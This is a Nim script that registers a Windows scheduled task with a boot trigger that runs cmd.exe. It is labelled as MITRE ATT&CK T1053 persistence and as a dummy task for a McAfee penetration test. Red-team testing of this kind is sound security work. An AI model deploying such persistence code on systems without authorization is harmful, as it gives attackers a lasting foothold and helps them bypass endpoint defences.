#[
    Script to schedule a task.
    Link: https://attack.mitre.org/techniques/T1053/

    Usage:
        scheduledTask.exe [username_of_win_account]
    Default:
        None
]#

import os
import system

import strformat

import winim
import winim/com

let
    triggerType = 9
    actionType = 0

var
    username: string
    password: string
    startTime = "2022-05-30T12:00:00"
    endTime = "2022-04-21T05:20:00"

const
    createTask = 6 #https://docs.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_creation

if paramCount() > 0:
    username = paramStr(1)
    password = paramStr(2)
else:
    echo "[-] Missing username, cannot schedule the task. Please provide a user like\n   --> command: nameOfThisExe.exe [YourUsername]"
    quit()

var comhandler = CreateObject("Schedule.Service")
comhandler.Connect()

var folder = comhandler.GetFolder("\\")
var taskDefinition = comhandler.NewTask(0)

var regInfo = taskDefinition.RegistrationInfo
regInfo.Description = "Dummytask for the Pentest of McAfee"
regInfo.Author = username

var settings = taskDefinition.Settings
settings.StartWhenAvailable = true
settings.Enabled = true
settings.Hidden = false

var triggers = taskDefinition.Triggers
var trigger = triggers.Create(9)  # TASK_TRIGGER_BOOT

trigger.StartBoundary = startTime
trigger.EndBoundary = endTime
trigger.ExecutionTimeLimit = "PT2M"
trigger.Id = "181364"
trigger.UserId = fmt"{username}" #fmt"DOMAIN\{username}"

var Action = taskDefinition.Actions.Create(actionType)
Action.Path = "cmd.exe"

echo fmt"[+] Scheduling the new Task from {startTime} - {endTime}"



try:
    #var result = folder.RegisterTaskDefinition("McAfeePT Trigger", taskDefinition, createTask, "Builtin\\Administrators", VT_EMPTY, 4)
    var result = folder.RegisterTaskDefinition("McAfeePT Trigger", taskDefinition, createTask, toVariant(username), toVariant(password), 3, VT_EMPTY, )
    echo result
    echo fmt"[+] Task successfully created"
except Exception as error:
    echo fmt"[-] {error.msg}"

Sleep(15000)

COM_FullRelease()
